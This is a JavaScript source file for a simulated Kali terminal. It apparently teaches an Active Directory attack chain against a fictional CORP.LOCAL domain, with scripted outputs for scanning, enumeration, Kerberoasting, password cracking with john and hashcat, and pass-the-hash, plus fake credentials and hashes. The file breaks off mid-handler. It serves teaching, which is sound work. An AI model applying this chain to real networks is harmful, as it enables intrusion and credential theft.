'use strict';

// ── Simulation state ──────────────────────────────────────────────────────────
const SIM = {
  cwd: '/home/kali',
  user: 'kali',          // 'kali' or 'root'
  windowsShell: false,
  hashesOnDisk: false,
  lootExfiltrated: false,
  files: {
    '/home/kali/notes.txt': `# Notes - DO NOT SHARE
# Found on workstation WS01 during initial recon
# ---
john.doe:Password1!
# TODO: rotate these after project ends`,
    '/root/notes.txt': `# Notes - DO NOT SHARE
# Found on workstation WS01 during initial recon
# ---
john.doe:Password1!
# TODO: rotate these after project ends`,
    '/home/kali/.bash_history': `sudo nmap -sn 10.10.10.0/24\nsudo nmap -sV -sC 10.10.10.10\nenum4linux -a 10.10.10.10`,
    '/etc/hosts': `127.0.0.1   localhost\n10.10.10.5  kali\n10.10.10.10 DC01.CORP.LOCAL`,
    '/etc/passwd': `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash`,
    '/etc/os-release': `PRETTY_NAME="Kali GNU/Linux Rolling"\nNAME="Kali GNU/Linux"\nID=kali\nID_LIKE=debian\nVERSION="2024.2"\nHOME_URL="https://www.kali.org/"`,
  },
};

// Random latency helper — adds realistic variance so no two runs feel identical
function jitter(base, spread) {
  return Math.round(base + (Math.random() * 2 - 1) * spread);
}

function simFiles() {
  const home = SIM.user === 'root' ? '/root' : '/home/kali';
  const f = { ...SIM.files };
  if (SIM.hashesOnDisk) {
    f[home + '/hashes.kerberoast'] = KRB5_HASHES;
    f['/home/kali/hashes.kerberoast'] = KRB5_HASHES;
    f['/root/hashes.kerberoast'] = KRB5_HASHES;
  }
  return f;
}

function isRoot() { return SIM.user === 'root'; }

const KRB5_HASHES = `$krb5tgs$23$*svc_backup$CORP.LOCAL$backup/dc01.corp.local*$8a3f2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f$1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/dc01.corp.local:1433*$9b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6$2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e
$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web.corp.local*$7c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7$3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f`;

// ── Command outputs ───────────────────────────────────────────────────────────
// Each handler: { id, match(cmd), output, lines[] (alt to output), event, after() }

const HANDLERS = [

  // ── sudo <editor> — skip password, just refuse ───────────────────────────
  {
    match: c => /^sudo\s+(nano|vim?|gedit|emacs|micro)\b/.test(c),
    lines: [{ t: (c) => `${c.replace(/^sudo\s+/, '').split(' ')[0]}: interactive editors not supported in this simulation`, cls: 'y' }],
  },

  // ── sudo (bare) ───────────────────────────────────────────────────────────
  {
    match: c => /^sudo\s*$/.test(c),
    lines: [{ t: 'usage: sudo [-ABknS] [-g group] [-H] [-p prompt] [-u user] [-i|-s] [command]', cls: 'r' }],
  },

  // ── sudo ─────────────────────────────────────────────────────────────────
  {
    match: c => /^sudo\s+./.test(c),
    waitSudo: true,
    lines: [],
  },

  // ── sudo -i / sudo su (become root permanently) ───────────────────────────
  // These are called by runAsSudo() after auth, not directly
  {
    id: 'become-root',
    match: c => c === '-i' || c === 'su' || c === 'su -' || c === '-s /bin/bash',
    loadTime: () => jitter(800, 200),
    lines: [],   // prompt change only
    after: (c) => { SIM.user = 'root'; if (c === '-i' || c === 'su -') SIM.cwd = '/root'; },
  },

  // ── apt / apt-get ─────────────────────────────────────────────────────────
  {
    match: c => /^apt(-get)?\s+update/.test(c),
    loadTime: () => jitter(3500, 900),
    lines: [
      { t: 'Hit:1 http://http.kali.org/kali kali-rolling InRelease', cls: 'b' },
      { t: 'Get:2 http://http.kali.org/kali kali-rolling/main amd64 Packages [19.1 MB]' },
      { t: 'Get:3 http://http.kali.org/kali kali-rolling/contrib amd64 Packages [98.8 kB]' },
      { t: 'Get:4 http://http.kali.org/kali kali-rolling/non-free amd64 Packages [149 kB]' },
      { t: 'Get:5 http://http.kali.org/kali kali-rolling/non-free-firmware amd64 Packages [9,660 B]' },
      { t: 'Fetched 19.4 MB in 8s (2,425 kB/s)' },
      { t: 'Reading package lists... Done', cls: 'g' },
    ],
    requireRoot: true,
  },
  {
    match: c => /^apt(-get)?\s+install/.test(c),
    loadTime: () => jitter(2200, 600),
    lines: [
      { t: 'Reading package lists... Done' },
      { t: 'Building dependency tree... Done' },
      { t: 'Reading state information... Done' },
      { t: (c) => {
        const pkg = c.replace(/^apt(-get)?\s+install\s+(-y\s+)?/, '').trim() || 'package';
        return `${pkg} is already the newest version.`;
      }, cls: 'g' },
      { t: '0 upgraded, 0 newly installed, 0 to remove and 127 not upgraded.' },
    ],
    requireRoot: true,
  },
  {
    match: c => /^apt(-get)?\s+upgrade/.test(c),
    loadTime: () => jitter(1800, 500),
    lines: [
      { t: 'Reading package lists... Done' },
      { t: 'Building dependency tree... Done' },
      { t: 'Calculating upgrade... Done' },
      { t: '0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.' },
    ],
    requireRoot: true,
  },
  {
    match: c => /^apt(-get)?\b/.test(c),
    lines: [{ t: (c) => `E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Unable to acquire the dpkg frontend lock, are you root?`, cls: 'r' }],
  },

  // ── Basic system ──────────────────────────────────────────────────────────
  {
    match: c => c === 'whoami',
    lines: [{ t: () => SIM.user }],
  },
  {
    match: c => c === 'id',
    lines: [{ t: () => isRoot()
      ? 'uid=0(root) gid=0(root) groups=0(root)'
      : 'uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),142(kaboxer)' }],
  },
  {
    match: c => c === 'hostname',
    lines: [{ t: 'kali' }],
  },
  {
    match: c => c.startsWith('uname'),
    lines: [{ t: 'Linux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux' }],
  },
  {
    match: c => c === 'pwd',
    lines: [{ t: () => SIM.cwd }],
  },
  {
    match: c => c === 'date',
    lines: [{ t: () => new Date().toString() }],
  },
  {
    match: c => c === 'uptime',
    lines: [{ t: ' 14:23:01 up 2:11,  1 user,  load average: 0.12, 0.08, 0.05' }],
  },
  {
    match: c => c === 'env' || c === 'printenv',
    lines: [
      { t: 'SHELL=/bin/bash' },
      { t: () => `USER=${SIM.user}` },
      { t: () => `HOME=${SIM.user === 'root' ? '/root' : '/home/kali'}` },
      { t: 'TERM=xterm-256color' },
      { t: 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
      { t: 'LANG=en_US.UTF-8' },
    ],
  },
  {
    match: c => c === 'history',
    lines: [
      { t: '    1  sudo nmap -sn 10.10.10.0/24' },
      { t: '    2  sudo nmap -sV -sC 10.10.10.10' },
      { t: '    3  enum4linux -a 10.10.10.10' },
      { t: '    4  cat /home/kali/notes.txt' },
    ],
  },

  // ── ls ────────────────────────────────────────────────────────────────────
  {
    match: c => /^ls(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const showHidden = cmd.includes('-a') || cmd.includes('-la') || cmd.includes('-al');
      const longFmt    = cmd.includes('-l') || cmd.includes('-la') || cmd.includes('-al');
      const home = SIM.user === 'root' ? '/root' : '/home/kali';
      const cwd  = SIM.cwd;

      // dirs: set of names that are directories
      let dirs    = new Set();
      let files   = [];
      let dotDirs = [];
      let dotFiles = [];

      if (cwd === '/home/kali') {
        dirs  = new Set(['Desktop','Documents','Downloads','Music','Pictures','Public','Templates','Videos']);
        files = ['notes.txt'];
        if (SIM.hashesOnDisk) files.push('hashes.kerberoast');
        dotDirs  = ['.config', '.local'];
        dotFiles = ['.bash_history', '.bash_logout', '.bashrc', '.profile'];
      } else if (cwd === '/root') {
        dirs     = new Set([]);
        files    = ['notes.txt'];
        if (SIM.hashesOnDisk) files.push('hashes.kerberoast');
        dotDirs  = ['.config'];
        dotFiles = ['.bash_history', '.bashrc', '.profile'];
      } else if (cwd === '/') {
        dirs  = new Set(['bin','boot','dev','etc','home','lib','lib64','media','mnt','opt','proc','root','run','sbin','srv','sys','tmp','usr','var']);
        files = [];
      } else if (cwd === '/etc') {
        dirs  = new Set(['apt','cron.d','default','init.d','network','ssl','systemd']);
        files = ['bash.bashrc','hostname','hosts','issue','os-release','passwd','profile','shadow','shells','sudoers'];
      } else if (cwd === '/usr/share/wordlists') {
        dirs  = new Set(['dirb','dirbuster','metasploit','nmap','wfuzz']);
        files = ['fasttrack.txt','rockyou.txt'];
      } else if (cwd === '/home') {
        dirs  = new Set(['kali']);
        files = [];
      } else if (cwd === '/home/kali/Desktop' || cwd === '/home/kali/Documents' ||
                 cwd === '/home/kali/Downloads' || cwd === '/home/kali/Music' ||
                 cwd === '/home/kali/Pictures' || cwd === '/home/kali/Public' ||
                 cwd === '/home/kali/Templates' || cwd === '/home/kali/Videos') {
        dirs = new Set([]); files = [];
      } else if (cwd === '/tmp') {
        dirs  = new Set([]);
        files = [];
        dotFiles = ['.font-unix', '.ICE-unix', '.X11-unix'];
      } else if (cwd.startsWith('/usr/share')) {
        dirs = new Set(['applications','doc','fonts','icons','man','metasploit-framework','wordlists']);
        files = [];
      } else if (cwd.startsWith('/var')) {
        dirs  = new Set(['backups','cache','lib','lock','log','mail','opt','run','spool','tmp']);
        files = [];
      } else {
        dirs = new Set([]); files = [];
      }

      // Build display list
      const allDirs  = [...dirs].sort();
      const allFiles = [...files].sort();
      let entries = [...allDirs, ...allFiles];
      let dotEntries = [...dotDirs.sort(), ...dotFiles.sort()];

      if (!longFmt) {
        let out = [];
        if (showHidden) out.push('. ', '.. ', ...dotEntries.map(e => e + (dotDirs.includes(e) ? '/' : '')));
        out.push(...allDirs.map(d => d + '/'), ...allFiles);
        // remove trailing slashes for display and colour dirs — just return plain for simplicity
        return out.map(e => e.replace(/\/$/, '')).join('  ') || '';
      }

      // Long format
      const now = 'Jan 15 14:23';
      const owner = SIM.user;
      const fmt = (name, isDir, sz, perm) => {
        const p = perm || (isDir ? 'drwxr-xr-x' : '-rw-r--r--');
        const s = String(sz || (isDir ? 4096 : 248)).padStart(8);
        return `${p}  1 ${owner} ${owner} ${s} ${now} ${name}`;
      };

      const lines = [];
      if (showHidden) {
        lines.push(fmt('.', true, 4096, 'drwxr-xr-x'));
        lines.push(fmt('..', true, 4096, 'drwxr-xr-x'));
        dotDirs.forEach(d  => lines.push(fmt(d, true)));
        dotFiles.forEach(f => lines.push(fmt(f, false, f === '.bash_history' ? 1423 : 220, '-rw-------')));
      }
      allDirs.forEach(d  => lines.push(fmt(d, true)));
      allFiles.forEach(f => {
        const sz = f.endsWith('.kerberoast') ? 3241 : f === 'rockyou.txt' ? 139921507 : 248;
        lines.push(fmt(f, false, sz));
      });
      return lines.join('\n') || '';
    }}],
  },

  // ── cat ───────────────────────────────────────────────────────────────────
  {
    match: c => /^cat\s/.test(c),
    lines: [{ t: (cmd) => {
      const arg = cmd.replace(/^cat\s+/, '').trim();
      const abs = arg.startsWith('/') ? arg : SIM.cwd.replace(/\/?$/, '/') + arg;
      const files = simFiles();
      // Try exact, then with /root/ prefix
      const content = files[abs] || files['/root/' + arg] || files[arg];
      if (content !== undefined) return content;
      return `cat: ${arg}: No such file or directory`;
    }, cls: (cmd) => {
      const arg = cmd.replace(/^cat\s+/, '').trim();
      const files = simFiles();
      const abs = arg.startsWith('/') ? arg : SIM.cwd.replace(/\/?$/, '/') + arg;
      return (files[abs] || files['/root/'+arg] || files[arg]) !== undefined ? '' : 'r';
    }}],
    event: (cmd) => cmd.includes('notes') ? 'cat-notes' : null,
  },

  // ── cd ────────────────────────────────────────────────────────────────────
  {
    match: c => /^cd(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const home = SIM.user === 'root' ? '/root' : '/home/kali';
      let arg = cmd.replace(/^cd\s*/, '').trim() || home;
      if (arg === '~') arg = home;
      else if (arg.startsWith('~/')) arg = home + arg.slice(1);
      if (arg !== '/') arg = arg.replace(/\/+$/, '');
      let target;
      if (!arg || arg === home) target = home;
      else if (arg === '..') target = SIM.cwd.split('/').slice(0, -1).join('/') || '/';
      else if (arg === '-') target = home;
      else if (arg.startsWith('/')) target = arg;
      else target = (SIM.cwd === '/' ? '' : SIM.cwd) + '/' + arg;
      // /root is mode 700 — only root can enter
      if (SIM.user !== 'root' && (target === '/root' || target.startsWith('/root/'))) {
        return `bash: cd: ${arg}: Permission denied`;
      }
      SIM.cwd = target;
      return '';
    }, cls: (cmd) => {
      const home = SIM.user === 'root' ? '/root' : '/home/kali';
      let arg = cmd.replace(/^cd\s*/, '').trim() || home;
      if (arg === '~') arg = home;
      else if (arg.startsWith('~/')) arg = home + arg.slice(1);
      if (arg !== '/') arg = arg.replace(/\/+$/, '');
      let target;
      if (!arg || arg === home) target = home;
      else if (arg === '..') target = SIM.cwd.split('/').slice(0, -1).join('/') || '/';
      else if (arg === '-') target = home;
      else if (arg.startsWith('/')) target = arg;
      else target = (SIM.cwd === '/' ? '' : SIM.cwd) + '/' + arg;
      return (SIM.user !== 'root' && (target === '/root' || target.startsWith('/root/'))) ? 'r' : '';
    }}],
  },

  // ── mkdir / touch / rm ────────────────────────────────────────────────────
  {
    match: c => /^(mkdir|touch|rm|cp|mv|chmod)\s/.test(c),
    lines: [{ t: '' }],
  },

  // ── Network ───────────────────────────────────────────────────────────────
  {
    match: c => c === 'ip a' || c === 'ip addr' || c === 'ifconfig',
    lines: [
      { t: 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500' },
      { t: '        inet 10.10.10.5  netmask 255.255.255.0  broadcast 10.10.10.255' },
      { t: '        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>' },
      { t: '        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)' },
      { t: '        RX packets 4821  bytes 892145 (871.2 KiB)' },
      { t: '        TX packets 3012  bytes 441092 (430.7 KiB)' },
      { t: '' },
      { t: 'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536' },
      { t: '        inet 127.0.0.1  netmask 255.0.0.0' },
    ],
  },
  {
    match: c => c.startsWith('ping'),
    loadTime: () => jitter(3200, 400),
    lines: [
      { t: (c) => `PING ${c.split(' ').pop()} 56(84) bytes of data.` },
      { t: (c) => `64 bytes from ${c.split(' ').pop()}: icmp_seq=1 ttl=128 time=1.23 ms` },
      { t: (c) => `64 bytes from ${c.split(' ').pop()}: icmp_seq=2 ttl=128 time=0.98 ms` },
      { t: (c) => `64 bytes from ${c.split(' ').pop()}: icmp_seq=3 ttl=128 time=1.05 ms` },
      { t: '^C' },
      { t: (c) => `--- ${c.split(' ').pop()} ping statistics ---` },
      { t: '3 packets transmitted, 3 received, 0% packet loss' },
    ],
  },

  // ── NMAP ─────────────────────────────────────────────────────────────────
  {
    id: 'nmap-discovery',
    loadTime: () => jitter(2600, 500),
    progressFn: (elapsed, total) => {
      const pct = Math.min(99.9, elapsed / total * 100).toFixed(1);
      const remMs = Math.max(0, total - elapsed);
      const remS = (remMs / 1000).toFixed(0);
      return [
        { t: `Stats: 0:${String(Math.floor(elapsed/1000)).padStart(2,'0')} elapsed; 0 hosts completed (0 up), 256 undergoing Ping Scan`, cls: 'd' },
        { t: `Ping Scan Timing: About ${pct}% done; ETC: --:-- (0:${remS.padStart(2,'0')} remaining)`, cls: 'd' },
      ];
    },
    match: c => /^nmap\b/.test(c) && (c.includes('/24') || c.includes('-sn')),
    lines: [
      { t: 'Starting Nmap 7.94 ( https://nmap.org ) at ' + new Date().toUTCString().slice(0,16) },
      { t: '' },
      { t: 'Nmap scan report for 10.10.10.1', cls: 'b' },
      { t: 'Host is up (0.00080s latency).' },
      { t: '' },
      { t: 'Nmap scan report for 10.10.10.5', cls: 'b' },
      { t: 'Host is up (0.000082s latency).' },
      { t: '' },
      { t: 'Nmap scan report for DC01.CORP.LOCAL (10.10.10.10)', cls: 'b' },
      { t: 'Host is up (0.0015s latency).' },
      { t: '' },
      { t: 'Nmap done: 256 IP addresses (3 hosts up) scanned in 2.41 seconds', cls: 'g' },
    ],
  },
  {
    id: 'nmap-full',
    loadTime: () => jitter(28000, 5000),
    progressFn: (elapsed, total) => {
      const elSec  = Math.floor(elapsed / 1000);
      const elMin  = Math.floor(elSec / 60);
      const elRemS = elSec % 60;
      const pct    = Math.min(99.99, elapsed / total * 100).toFixed(2);
      const remMs  = Math.max(0, total - elapsed);
      const remSec = Math.floor(remMs / 1000);
      const remMin = Math.floor(remSec / 60);
      const remRemS = remSec % 60;
      const etc   = new Date(Date.now() + remMs);
      const etcStr = `${String(etc.getHours()).padStart(2,'0')}:${String(etc.getMinutes()).padStart(2,'0')}`;
      return [
        { t: `Stats: ${elMin}:${String(elRemS).padStart(2,'0')} elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan`, cls: 'd' },
        { t: `SYN Stealth Scan Timing: About ${pct}% done; ETC: ${etcStr} (${remMin}:${String(remRemS).padStart(2,'0')} remaining)`, cls: 'd' },
      ];
    },
    match: c => /^nmap\b/.test(c) && c.includes('10.10.10.10'),
    lines: [
      { t: 'Starting Nmap 7.94 ( https://nmap.org ) at ' + new Date().toUTCString().slice(0,16) },
      { t: 'Nmap scan report for DC01.CORP.LOCAL (10.10.10.10)' },
      { t: 'Host is up (0.0015s latency).' },
      { t: 'Not shown: 65514 filtered tcp ports (no-response)' },
      { t: 'PORT      STATE SERVICE       VERSION' },
      { t: '53/tcp    open  domain        Simple DNS Plus', cls: 'g' },
      { t: '80/tcp    open  http          Microsoft IIS httpd 10.0', cls: 'g' },
      { t: '88/tcp    open  kerberos-sec  Microsoft Windows Kerberos', cls: 'g' },
      { t: '135/tcp   open  msrpc         Microsoft Windows RPC', cls: 'g' },
      { t: '139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn', cls: 'g' },
      { t: '389/tcp   open  ldap          Microsoft Windows Active Directory LDAP', cls: 'g' },
      { t: '445/tcp   open  microsoft-ds?', cls: 'g' },
      { t: '464/tcp   open  kpasswd5?', cls: 'g' },
      { t: '593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0', cls: 'g' },
      { t: '636/tcp   open  ldapssl?', cls: 'g' },
      { t: '3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP', cls: 'g' },
      { t: '5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)', cls: 'g' },
      { t: '' },
      { t: 'Host script results:' },
      { t: '| smb2-security-mode:' },
      { t: '|   3:1:1:' },
      { t: '|_    Message signing enabled and required' },
      { t: '| smb2-time:' },
      { t: '|   date: 2024-01-15T14:11:47' },
      { t: '' },
      { t: 'Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows' },
      { t: '' },
      { t: 'Nmap done: 1 IP address (1 host up) scanned in 28.41 seconds', cls: 'g' },
    ],
  },

  // ── enum4linux ────────────────────────────────────────────────────────────
  {
    id: 'enum4linux',
    loadTime: () => jitter(5500, 1200),
    match: c => /^enum4linux\b/.test(c) && c.includes('10.10.10.10'),
    lines: [
      { t: 'Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )', cls: 'b' },
      { t: '' },
      { t: ' ========================== Target Information ==========================' },
      { t: ' Target ........... 10.10.10.10' },
      { t: ' RID Range ........ 500-550,1000-' },
      { t: ' Username ......... \'\'' },
      { t: '' },
      { t: ' ======================== Workgroup/Domain =========================' },
      { t: '[+] Got domain/workgroup name: CORP', cls: 'g' },
      { t: '' },
      { t: ' ======================== OS information =========================' },
      { t: '[+] Got OS info for 10.10.10.10 from smbclient: Domain=[CORP] OS=[Windows Server 2019 Standard 17763] Server=[Windows Server 2019 Standard 6.3]', cls: 'g' },
      { t: '' },
      { t: ' ======================== Users =========================' },
      { t: '[+] Got userlist with 7 members', cls: 'g' },
      { t: 'index: 0x1 RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator', cls: 'g' },
      { t: 'index: 0x2 RID: 0x1f5 acb: 0x00000215 Account: Guest          Name: Guest', cls: 'd' },
      { t: 'index: 0x3 RID: 0x1f6 acb: 0x00000011 Account: krbtgt         Name: krbtgt', cls: 'd' },
      { t: 'index: 0x4 RID: 0x44f acb: 0x00000210 Account: john.doe       Name: John Doe', cls: 'g' },
      { t: 'index: 0x5 RID: 0x450 acb: 0x00000210 Account: svc_backup     Name: Backup Service', cls: 'g' },
      { t: 'index: 0x6 RID: 0x451 acb: 0x00000210 Account: svc_sql        Name: SQL Service', cls: 'g' },
      { t: 'index: 0x7 RID: 0x452 acb: 0x00000210 Account: svc_web        Name: Web Service', cls: 'g' },
      { t: '' },
      { t: ' ======================== Share Enumeration =========================' },
      { t: '\tSharename       Type      Comment' },
      { t: '\t---------       ----      -------' },
      { t: '\tSYSVOL          Disk      Logon server share', cls: 'b' },
      { t: '\tNETLOGON        Disk      Logon server share', cls: 'b' },
      { t: '\tIPC$            IPC       Remote IPC', cls: 'd' },
      { t: '' },
      { t: ' ======================== Password Policy Information =========================' },
      { t: '[+] Minimum password length: 7', cls: 'g' },
      { t: '[+] Password history length: 24', cls: 'g' },
      { t: '[+] Maximum password age: 41 days', cls: 'g' },
      { t: '[+] Account lockout threshold: 5', cls: 'g' },
      { t: '' },
      { t: 'enum4linux complete on ' + new Date().toUTCString().slice(0,16), cls: 'g' },
    ],
  },

  // ── CrackMapExec — john.doe ───────────────────────────────────────────────
  {
    id: 'cme-johndoe',
    loadTime: () => jitter(1600, 500),
    match: c => /^crackmapexec\b/.test(c) && c.includes('john.doe') && (c.includes('Password1') || c.includes("'Password1!'")),
    lines: [
      { t: 'SMB         10.10.10.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)' },
      { t: 'SMB         10.10.10.10     445    DC01             [+] CORP.LOCAL\\john.doe:Password1!', cls: 'g' },
    ],
  },

  // ── CrackMapExec — svc_backup ─────────────────────────────────────────────
  {
    id: 'cme-svcbackup',
    loadTime: () => jitter(1500, 450),
    match: c => /^crackmapexec\b/.test(c) && c.includes('svc_backup') && c.includes('Backup2023'),
    lines: [
      { t: 'SMB         10.10.10.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)' },
      { t: 'SMB         10.10.10.10     445    DC01             [+] CORP.LOCAL\\svc_backup:Backup2023! (Backup Operators)', cls: 'g' },
    ],
  },

  // ── CrackMapExec — Pass-the-Hash ─────────────────────────────────────────
  {
    id: 'cme-pth',
    loadTime: () => jitter(1400, 400),
    match: c => /^crackmapexec\b/.test(c) && c.includes('Administrator') && c.includes('-H') && c.includes('fc525c'),
    lines: [
      { t: 'SMB         10.10.10.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)' },
      { t: 'SMB         10.10.10.10     445    DC01             [+] CORP.LOCAL\\Administrator:fc525c9683e8fe067095ba2ddc971889 (Pwn3d!)', cls: 'g' },
    ],
  },

  // ── CrackMapExec — bad creds ─────────────────────────────────────────────
  {
    loadTime: () => jitter(1200, 400),
    match: c => /^crackmapexec\b/.test(c),
    lines: [
      { t: (c) => 'SMB         10.10.10.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)' },
      { t: (c) => 'SMB         10.10.10.10     445    DC01             [-] Authentication failed', cls: 'r' },
    ],
  },

  // ── GetUserSPNs — enumerate (no -request) ────────────────────────────────
  {
    id: 'spns-enum',
    loadTime: () => jitter(2500, 600),
    match: c => /impacket-GetUserSPNs|GetUserSPNs/.test(c) && c.includes('10.10.10.10') && !c.includes('-request'),
    lines: [
      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra' },
      { t: '' },
      { t: 'ServicePrincipalName          Name        MemberOf  PasswordLastSet              LastLogon' },
      { t: '----------------------------  ----------  --------  ---------------------------  ---------------------------' },
      { t: 'backup/dc01.corp.local        svc_backup            2024-01-10 09:15:43.000000   2024-01-14 18:32:17.000000', cls: 'g' },
      { t: 'MSSQLSvc/dc01.corp.local:1433 svc_sql               2024-01-08 11:22:01.000000   2024-01-13 09:45:22.000000', cls: 'g' },
      { t: 'HTTP/web.corp.local           svc_web               2024-01-05 14:30:15.000000   2024-01-12 16:20:08.000000', cls: 'g' },
    ],
  },

  // ── GetUserSPNs — request TGS tickets ────────────────────────────────────
  {
    id: 'spns-request',
    loadTime: () => jitter(3500, 800),
    match: c => /impacket-GetUserSPNs|GetUserSPNs/.test(c) && c.includes('10.10.10.10') && c.includes('-request'),
    lines: [
      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra' },
      { t: '' },
      { t: 'ServicePrincipalName          Name        MemberOf  PasswordLastSet              LastLogon' },
      { t: '----------------------------  ----------  --------  ---------------------------  ---------------------------' },
      { t: 'backup/dc01.corp.local        svc_backup            2024-01-10 09:15:43.000000   2024-01-14 18:32:17.000000', cls: 'g' },
      { t: 'MSSQLSvc/dc01.corp.local:1433 svc_sql               2024-01-08 11:22:01.000000   2024-01-13 09:45:22.000000', cls: 'g' },
      { t: 'HTTP/web.corp.local           svc_web               2024-01-05 14:30:15.000000   2024-01-12 16:20:08.000000', cls: 'g' },
      { t: '' },
      { t: '$krb5tgs$23$*svc_backup$CORP.LOCAL$backup/dc01.corp.local*$8a3f2b1c...', cls: 'y' },
      { t: '$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/dc01.corp.local:1433*$9b4c3d2e...', cls: 'y' },
      { t: '$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web.corp.local*$7c5d4e3f...', cls: 'y' },
      { t: '' },
      { t: (c) => c.includes('-outputfile') ? '[*] Saving 3 tickets to hashes.kerberoast' : '' , cls: 'b' },
    ],
    after: (c) => { if (c.includes('-outputfile') || c.includes('hashes.kerberoast')) SIM.hashesOnDisk = true; },
  },

  // ── john — crack ──────────────────────────────────────────────────────────
  {
    id: 'john-crack',
    loadTime: () => jitter(6500, 1500),
    match: c => /^john\b/.test(c) && c.includes('hashes') && !c.includes('--show'),
    lines: [
      { t: 'Using default input encoding: UTF-8' },
      { t: 'Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])' },
      { t: 'Will run 4 OpenMP threads' },
      { t: 'Press \'q\' or Ctrl-C to abort, almost any other key for status' },
      { t: '' },
      { t: 'Backup2023!      (svc_backup)', cls: 'g' },
      { t: 'SqlServer1!      (svc_sql)', cls: 'g' },
      { t: 'Welcome123       (svc_web)', cls: 'g' },
      { t: '' },
      { t: '3g 0:00:00:23 DONE (2024-01-15 14:18) 0.1298g/s 1865p/s 5595c/s', cls: 'd' },
      { t: 'Use the "--show" option to display all of the cracked passwords reliably', cls: 'd' },
      { t: 'Session completed.', cls: 'g' },
    ],
  },

  // ── john --show ───────────────────────────────────────────────────────────
  {
    match: c => /^john\b/.test(c) && c.includes('--show'),
    loadTime: () => jitter(400, 100),
    lines: [
      { t: 'svc_backup:Backup2023!:CORP.LOCAL:backup/dc01.corp.local:$krb5tgs$23$*svc_backup$...', cls: 'g' },
      { t: 'svc_sql:SqlServer1!:CORP.LOCAL:MSSQLSvc/dc01.corp.local:1433:$krb5tgs$23$*svc_sql$...', cls: 'g' },
      { t: 'svc_web:Welcome123:CORP.LOCAL:HTTP/web.corp.local:$krb5tgs$23$*svc_web$...', cls: 'g' },
      { t: '' },
      { t: '3 password hashes cracked, 0 left' },
    ],
  },

  // ── hashcat ───────────────────────────────────────────────────────────────
  {
    id: 'hashcat',
    loadTime: () => jitter(5500, 1200),
    match: c => /^hashcat\b/.test(c) && c.includes('13100'),
    lines: [
      { t: 'hashcat (v6.2.6) starting...' },
      { t: '' },
      { t: 'OpenCL API (OpenCL 3.0 LINUX) - Platform #1 [Intel(R) Corporation]' },
      { t: '* Device #1: AMD Radeon RX 6800 XT, 16256/16368 MB (4092 MB allocatable), 36MCU' },
      { t: '' },
      { t: 'Minimum password length supported by kernel: 0', cls: 'd' },
      { t: 'Maximum password length supported by kernel: 256', cls: 'd' },
      { t: '' },
      { t: 'Hashes: 3 digests; 3 unique digests, 3 unique salts' },
      { t: 'Bitmaps: 16 bits, 65536 entries' },
      { t: 'Applicable optimizers applied:' },
      { t: '* Zero-Byte, Not-Iterated, Single-Version' },
      { t: '' },
